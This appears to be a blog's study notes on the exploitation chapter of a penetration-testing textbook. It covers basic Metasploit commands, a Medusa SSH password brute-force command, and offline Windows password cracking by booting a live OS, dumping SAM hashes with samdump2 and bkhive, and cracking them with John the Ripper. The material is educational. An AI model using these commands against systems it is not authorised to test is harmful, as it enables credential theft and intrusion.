CHAPTER4 Exploitation
--------------------------------------
1、渗透神器 **Metasploit**

基本用法：

```
msf> msfconsole
msf> search missing_patch_number (or CVE)
use exploit_name_and_path
msf> show payloads
msf> set payload path_to_payload
msf> show optionsA
msf> set option_name desired_option_input
msf> exploit
```

一份不错的教程：

Metasploit Unleashed [https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/)

2、在线各类服务密码破解

 - Medusa

```
medusa –h 192.168.18.132 –u ownedb –P /usr/share/john/password.lst –M ssh
```

 - THC Hydra [https://www.thc.org/thc-hydra/](https://www.thc.org/thc-hydra/)


3、系统密码破解神器 John the Ripper

本地Windows密码破解

  1. Shut down the target machine.
  
  2. Boot the target to Backtack or an alternate OS via a live CD or USB drive.
  
  3. Mount the local hard drive.

```
  mkdir /mnt/sda1
  mount /dev/sda1 /mnt/sda1
  cd /mnt/sda1/Windows/system32/config
```

<div align="center" markdown="1">
<img src="https://github.com/victor-infosec/victor-infosec.github.io/raw/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/5.png" alt="渗透测试流程5" height="50%" width="50%" />
</div>

  \4. Use Samdump2 and to extract the hashes.

```
  samdump2 system SAM > /tmp/hashes.txt
```

<div align="center" markdown="1">
<img src="https://github.com/victor-infosec/victor-infosec.github.io/raw/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/6.png" alt="渗透测试流程6" height="50%" width="50%" />
</div>

 Accessing the raw hashes on some Windows systems may require an extra step. Bkhive is a tool which allows you to extract the Syskey bootkey from the system hive. It may be necessary to use bkhive to extract the system key in order to fully expose the password hashes.

```
  bkhive system sys_key.txt
  samdump2 SAM sys_key.txt > /tmp/hash.txt
```

  \5. Use JtR to crack the passwords.

```
  john /tmp/hashes.txt --format=nt
```

 <div align="center" markdown="1">
<img src="https://github.com/victor-infosec/victor-infosec.github.io/raw/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/3.png" alt="渗透测试流程7" height="50%" width="50%" />
</div>
